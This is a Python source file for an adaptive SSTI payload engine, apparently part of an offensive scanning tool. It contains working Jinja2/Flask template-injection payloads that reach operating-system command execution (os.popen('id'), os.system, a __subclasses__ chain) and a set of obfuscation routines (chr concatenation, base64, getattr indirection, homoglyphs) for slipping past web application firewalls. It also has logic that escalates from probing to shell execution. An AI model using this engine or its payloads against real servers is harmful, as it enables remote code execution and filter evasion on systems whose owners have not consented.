# app/core/ai_payload_engine.py
import re
import hashlib
import json
from typing import Dict, List, Tuple, Optional
from enum import Enum

class ResponseType(Enum):
    EVALUATED = "evaluated"      # Math/string output matches payload
    FILTERED = "filtered"        # Connection reset, WAF block
    SYNTAX_ERROR = "syntax_error" # Error message with syntax issues
    NEUTRAL = "neutral"          # Payload echoed or ignored
    EXECUTED = "executed"        # OOB callback received

class PayloadStrategy:
    def __init__(self):
        self.target_cache = {}  # Per-target knowledge cache
        self.obfuscation_methods = self._init_obfuscation_methods()
        self.payload_primitives = self._init_payload_primitives()
        
    def _init_obfuscation_methods(self):
        """Initialize payload obfuscation techniques"""
        return {
            'string_split': lambda s: f"'{s[:len(s)//2]}'+'{s[len(s)//2:]}'",
            'getattr_indirect': lambda s: f"getattr(globals()['__builtins__'], '{s}')",
            'unicode_homoglyph': lambda s: s.replace('_', '\u005f').replace('class', 'cl\u0430ss'),
            'list_unpack': lambda s: f"[*'{s}'][0] if len('{s}') == 1 else ''.join([*'{s}'])",
            'dict_access': lambda s: f"{{'key': '{s}'}}['key']",
            'format_string': lambda s: f"'{{}}'.format('{s}').replace('{{}}', '{s}')",
            'chr_concat': lambda s: '+'.join([f"chr({ord(c)})" for c in s]),
            'base64_decode': lambda s: f"__import__('base64').b64decode('{self._b64encode(s)}').decode()",
        }
    
    def _b64encode(self, s):
        import base64
        return base64.b64encode(s.encode()).decode()
    
    def _init_payload_primitives(self):
        """Initialize SSTI payload primitives with dangerous tokens"""
        return {
            'python_class_access': {
                'template': "().__class__.__base__.__subclasses__()",
                'dangerous_tokens': ['__class__', '__base__', '__subclasses__']
            },
            'python_builtins': {
                'template': "__import__('os').system('id')",
                'dangerous_tokens': ['__import__', 'os', 'system']
            },
            'jinja2_config': {
                'template': "{{config}}",
                'dangerous_tokens': ['config']
            },
            'jinja2_request': {
                'template': "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                'dangerous_tokens': ['request', '__globals__', '__builtins__', '__import__']
            },
            'flask_globals': {
                'template': "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
                'dangerous_tokens': ['url_for', '__globals__', '__builtins__', '__import__']
            }
        }
    
    def classify_response(self, payload: str, response_data: dict, oob_received: bool = False) -> ResponseType:
        """Classify target response to determine next strategy"""
        if oob_received:
            return ResponseType.EXECUTED
            
        status_code = response_data.get('status_code', 0)
        content = response_data.get('content', '')
        headers = response_data.get('headers', {})
        
        # Check for connection issues (filtered)
        if status_code == 0 or 'connection_error' in response_data:
            return ResponseType.FILTERED
            
        # Check for WAF blocks
        waf_indicators = ['blocked', 'forbidden', 'security', 'firewall', 'protection']
        if any(indicator in content.lower() for indicator in waf_indicators):
            return ResponseType.FILTERED
            
        # Check for syntax errors
        error_patterns = [
            r'syntax\s*error',
            r'invalid\s*syntax',
            r'unexpected\s*token',
            r'template\s*syntax\s*error'
        ]
        if any(re.search(pattern, content, re.IGNORECASE) for pattern in error_patterns):
            return ResponseType.SYNTAX_ERROR
            
        # Check for evaluation (math operations)
        if self._check_evaluation(payload, content):
            return ResponseType.EVALUATED
            
        # Check if payload was simply echoed back
        if payload in content:
            return ResponseType.NEUTRAL
            
        return ResponseType.NEUTRAL
    
    def _check_evaluation(self, payload: str, content: str) -> bool:
        """Check if mathematical expressions were evaluated"""
        # Look for simple math evaluation
        math_patterns = [
            (r'\{\{\s*(\d+)\s*\*\s*(\d+)\s*\}\}', lambda m: str(int(m.group(1)) * int(m.group(2)))),
            (r'\{\{\s*(\d+)\s*\+\s*(\d+)\s*\}\}', lambda m: str(int(m.group(1)) + int(m.group(2)))),
            (r'\$\{\s*(\d+)\s*\*\s*(\d+)\s*\}', lambda m: str(int(m.group(1)) * int(m.group(2))))
        ]
        
        for pattern, calc_func in math_patterns:
            matches = re.finditer(pattern, payload)
            for match in matches:
                expected_result = calc_func(match)
                if expected_result in content:
                    return True
        return False
    
    def get_target_cache(self, target_url: str) -> dict:
        """Get or create target-specific cache"""
        if target_url not in self.target_cache:
            self.target_cache[target_url] = {
                'blocked_tokens': {},
                'working_bypasses': {},
                'successful_payloads': []
            }
        return self.target_cache[target_url]
    
    def next_payload(self, target_url: str, current_payload: str, last_result: ResponseType, 
                    payload_type: str = 'python_class_access') -> Optional[str]:
        """Generate next payload based on last result"""
        cache = self.get_target_cache(target_url)
        
        if last_result == ResponseType.EVALUATED:
            # Success! Move to next stage
            cache['successful_payloads'].append(current_payload)
            return self._advance_payload_stage(payload_type, current_payload)
            
        elif last_result == ResponseType.FILTERED:
            # Find blocked token and apply obfuscation
            return self._obfuscate_blocked_payload(target_url, current_payload, payload_type)
            
        elif last_result == ResponseType.SYNTAX_ERROR:
            # Try different template syntax
            return self._try_alternative_syntax(current_payload, payload_type)
            
        return None
    
    def _obfuscate_blocked_payload(self, target_url: str, payload: str, payload_type: str) -> str:
        """Apply obfuscation to bypass filters"""
        cache = self.get_target_cache(target_url)
        primitive = self.payload_primitives.get(payload_type, {})
        dangerous_tokens = primitive.get('dangerous_tokens', [])
        
        # Find which token was likely blocked
        for token in dangerous_tokens:
            if token in payload and token not in cache['working_bypasses']:
                # Try different obfuscation methods
                for method_name, method_func in self.obfuscation_methods.items():
                    if f"{token}_{method_name}" not in cache['blocked_tokens']:
                        try:
                            obfuscated_token = method_func(token)
                            new_payload = payload.replace(token, obfuscated_token)
                            return new_payload
                        except:
                            continue
        
        return payload
    
    def _try_alternative_syntax(self, payload: str, payload_type: str) -> str:
        """Try alternative template syntax"""
        syntax_alternatives = {
            '{{': ['${', '<%=', '#set($x=', '[['],
            '}}': ['}', '%>', ')', ']]'],
        }
        
        new_payload = payload
        for old_syntax, alternatives in syntax_alternatives.items():
            if old_syntax in payload:
                for alt in alternatives:
                    new_payload = new_payload.replace(old_syntax, alt, 1)
                    break
        
        return new_payload
    
    def _advance_payload_stage(self, payload_type: str, successful_payload: str) -> str:
        """Advance to next stage after successful evaluation"""
        if 'class_access' in payload_type:
            # Move to subclass enumeration
            return successful_payload.replace('()', '[104]')  # subprocess.Popen index
        elif 'subclasses' in successful_payload:
            # Move to command execution
            return successful_payload + "('id', shell=True)"
        
        return successful_payload

class AIPayloadEngine:
    def __init__(self):
        self.strategy = PayloadStrategy()
        self.oob_callbacks = {}
        
    def generate_adaptive_payloads(self, target_url: str, payload_type: str = 'python_class_access') -> List[str]:
        """Generate initial payload set for testing"""
        primitive = self.strategy.payload_primitives.get(payload_type, {})
        base_template = primitive.get('template', '')
        
        # Generate test payloads with math evaluation
        test_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            base_template,
            f"{{{{ {base_template} }}}}",
            f"${{ {base_template} }}"
        ]
        
        return test_payloads
    
    def process_response_and_adapt(self, target_url: str, payload: str, response_data: dict, 
                                 payload_type: str = 'python_class_access') -> Tuple[ResponseType, Optional[str]]:
        """Process response and generate next payload"""
        # Check for OOB callbacks
        oob_received = self._check_oob_callback(target_url, payload)
        
        # Classify response
        result_type = self.strategy.classify_response(payload, response_data, oob_received)
        
        # Generate next payload
        next_payload = self.strategy.next_payload(target_url, payload, result_type, payload_type)
        
        return result_type, next_payload
    
    def _check_oob_callback(self, target_url: str, payload: str) -> bool:
        """Check if OOB callback was received"""
        # This would integrate with actual OOB callback system
        callback_id = hashlib.md5(f"{target_url}_{payload}".encode()).hexdigest()[:8]
        return callback_id in self.oob_callbacks
    
    def register_oob_callback(self, callback_id: str):
        """Register received OOB callback"""
        self.oob_callbacks[callback_id] = True
    
    def get_target_intelligence(self, target_url: str) -> dict:
        """Get accumulated intelligence about target"""
        cache = self.strategy.get_target_cache(target_url)
        return {
            'blocked_tokens': list(cache['blocked_tokens'].keys()),
            'working_bypasses': cache['working_bypasses'],
            'successful_payloads': cache['successful_payloads'],
            'recommended_approach': self._get_recommended_approach(cache)
        }
    
    def _get_recommended_approach(self, cache: dict) -> str:
        """Recommend best approach based on learned intelligence"""
        if cache['successful_payloads']:
            return "direct_execution"
        elif cache['working_bypasses']:
            return "obfuscation_based"
        elif cache['blocked_tokens']:
            return "alternative_syntax"
        else:
            return "reconnaissance_needed"